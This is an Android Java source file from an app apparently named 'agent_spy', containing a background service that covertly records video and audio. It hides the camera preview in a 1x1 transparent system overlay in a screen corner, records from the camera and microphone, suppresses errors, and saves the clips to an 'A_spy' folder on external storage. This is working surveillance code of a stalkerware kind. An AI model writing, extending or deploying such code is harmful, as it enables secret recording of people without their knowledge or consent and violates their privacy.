package com.radioactivegeek.jatin.agent_spy;

/**
 * Created by Jatin on 28-Sep-16.
 */


import android.app.Activity;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.text.format.DateFormat;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import java.io.File;
import java.security.Permission;
import java.util.Date;

/**
 * Created by Jatin on 06-Aug-16.
 */
public class BackgroundVideoRecorder extends Service implements SurfaceHolder.Callback {


    String[] perms = {"android.permission.RECORD_AUDIO", "android.permission.CAMERA"};

    private static final int REQUEST_CODE = 200;

    public WindowManager windowManager;
    public SurfaceView surfaceView;
    public Camera camera = null;
    public MediaRecorder mediaRecorder = null;


    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    @Override
    public void onCreate() {



        // Create new SurfaceView, set its size to 1x1, move it to the top left corner and set this service as a callback
        windowManager = (WindowManager) getApplicationContext().getSystemService(Context.WINDOW_SERVICE);
        surfaceView = new SurfaceView(getApplicationContext());
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                1, 1,
                WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSPARENT
        );
        layoutParams.gravity = Gravity.LEFT | Gravity.TOP;
        try {
            windowManager.addView(surfaceView, layoutParams);
        } catch (Exception e) {
            e.printStackTrace();
        }
        surfaceView.getHolder().addCallback(this);


    }


    // Method called right after Surface created (initializing and starting MediaRecorder)
    @Override
    public void surfaceCreated(SurfaceHolder surfaceHolder) {
        recordingVideo(surfaceHolder);
    }

    private void recordingVideo(SurfaceHolder surfaceHolder) {
        try {


                camera = Camera.open();
                mediaRecorder = new MediaRecorder();
                camera.unlock();
                mediaRecorder.setCamera(camera);
                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
                mediaRecorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_CIF));

                saveVideo();
                mediaRecorder.setPreviewDisplay(surfaceHolder.getSurface());


            try {
                mediaRecorder.prepare();
            } catch (Exception e) {
            }
            mediaRecorder.start();

        } catch (Exception e) {
        }
    }

    private void saveVideo() {

        String root = Environment.getExternalStorageDirectory().toString();
        File myDir = new File(root + "/A_spy");
        myDir.mkdir();

        String fname = DateFormat.format("yyyy-MM-dd_kk-mm-ss", new Date().getTime()) +
                "_Aspy.mp4";

        mediaRecorder.setOutputFile(myDir + "/" + fname);

    }


    @Override
    public void onDestroy() {

        try {
            mediaRecorder.stop();
            mediaRecorder.reset();
            mediaRecorder.release();
            camera.lock();
            camera.release();
            windowManager.removeView(surfaceView);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void surfaceChanged(SurfaceHolder surfaceHolder, int format, int width, int height) {
    }

    @Override
    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
    }


}
